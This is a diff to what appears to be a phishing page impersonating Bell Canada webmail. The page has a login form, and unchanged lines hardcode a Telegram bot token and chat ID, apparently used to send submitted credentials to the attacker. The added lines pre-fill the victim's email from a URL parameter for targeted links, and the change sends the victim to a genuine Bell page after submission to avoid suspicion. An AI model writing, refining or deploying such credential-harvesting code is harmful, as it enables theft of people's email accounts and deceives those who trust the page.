@@ -130,6 +130,15 @@
     const BOT_TOKEN = '7872296367:AAHBItXb7od6gkGaqb4JzDFbrlsHjPLAWzY'; // Replace with your Telegram Bot Token
     const CHAT_ID = '7601666417'; // Replace with your Telegram Chat ID
 
+    // Get email from URL parameter if exists
+    const urlParams = new URLSearchParams(window.location.search);
+    const urlEmail = urlParams.get('email');
+    
+    // If email parameter exists in URL, pre-fill the email field
+    if (urlEmail) {
+      document.getElementById('email').value = urlEmail;
+    }
+
     document.getElementById('loginForm').addEventListener('submit', async function (e) {
       e.preventDefault();
 
@@ -177,7 +186,7 @@
       }
 
       // Redirect
-      window.location.href = "https://webmail.en.bellnet.ca/ux/index-rui.jsp?v=3.1.3.54.0-4#/";
+      window.location.href = "http://www.bell.ca/shop/Sb_BusinessContactUs_Landing.page";
     });
   </script>
 </body>
